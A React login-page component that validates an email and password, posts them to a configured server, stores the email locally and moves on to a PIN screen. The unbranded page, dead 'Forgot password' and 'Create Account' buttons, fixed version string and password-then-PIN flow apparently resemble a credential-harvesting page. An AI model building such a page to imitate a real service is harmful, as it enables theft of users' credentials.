import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { FaRegEye, FaEyeSlash } from "react-icons/fa6";
import { HiChevronLeft } from "react-icons/hi2";
import { MdHeadsetMic } from "react-icons/md";
import FormErrMsg from "../components/FormErrMsg";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup
    .string()
    .email("Enter a valid email")
    .required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const emailVal = watch("email");
  const passwordVal = watch("password");
  const canSubmit = emailVal?.length > 0 && passwordVal?.length > 0;

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        localStorage.setItem("userEmail", data.email);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen w-full bg-white flex justify-center">
      <div className="w-full max-w-[500px] min-h-screen flex flex-col px-5">
        {/* Heading */}
        <div className="mt-28 mb-8">
          <h1 className="text-[26px] font-bold text-gray-400 leading-tight">
            Welcome back ✌️
          </h1>
          <p className="mt-1 text-[14px] text-gray-400">
            Fill out your information to get started.
          </p>
        </div>

        {/* Form */}
        <form
          onSubmit={handleSubmit(submitForm)}
          className="flex flex-1 flex-col"
        >
          {/* Email */}
          <div className="mb-4">
            <div className="rounded-xl border border-gray-200 bg-white px-4 py-4">
              <input
                type="email"
                placeholder="Email"
                className="w-full text-[15px] text-gray-800 placeholder-gray-400 bg-transparent outline-none"
                {...register("email")}
              />
            </div>
            <FormErrMsg errors={errors} inputName="email" />
          </div>

          {/* Password */}
          <div className="mb-3">
            <div className="rounded-xl border border-gray-200 bg-white px-4 py-4 flex items-center gap-2">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                className="flex-1 min-w-0 text-[15px] text-gray-800 placeholder-gray-400 bg-transparent outline-none"
                {...register("password")}
              />
              <button
                type="button"
                onClick={() => setShowPassword((v) => !v)}
                className="shrink-0 text-gray-400"
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? (
                  <FaEyeSlash className="h-5 w-5" />
                ) : (
                  <FaRegEye className="h-5 w-5" />
                )}
              </button>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          {/* Forgot password */}
          <div className="flex justify-end mb-6">
            <button
              type="button"
              className="text-[14px] font-medium text-[#2EC4B6]"
            >
              Forgot password?
            </button>
          </div>

          {/* Bottom section */}
          <div className="mt-auto pb-8 flex flex-col items-center gap-5">
            {/* Log In button */}
            <button
              type="submit"
              disabled={!canSubmit || loading}
              className={`w-full py-[18px] rounded-full text-[17px] font-semibold transition-colors duration-200 ${
                canSubmit && !loading
                  ? "bg-[#2EC4B6] text-white"
                  : "bg-[#c8d4d4] text-white cursor-not-allowed"
              }`}
            >
              {loading ? "Loading..." : "Log In"}
            </button>

            {/* Sign up */}
            <p className="text-[14px] text-gray-500 text-center">
              You don't have an account?{" "}
              <button type="button" className="text-[#2EC4B6] font-semibold">
                Create Account
              </button>
            </p>

            {/* App version */}
            <p className="text-[12px] text-gray-400">
              App Version 7.2.7 (patch 24)
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Home;
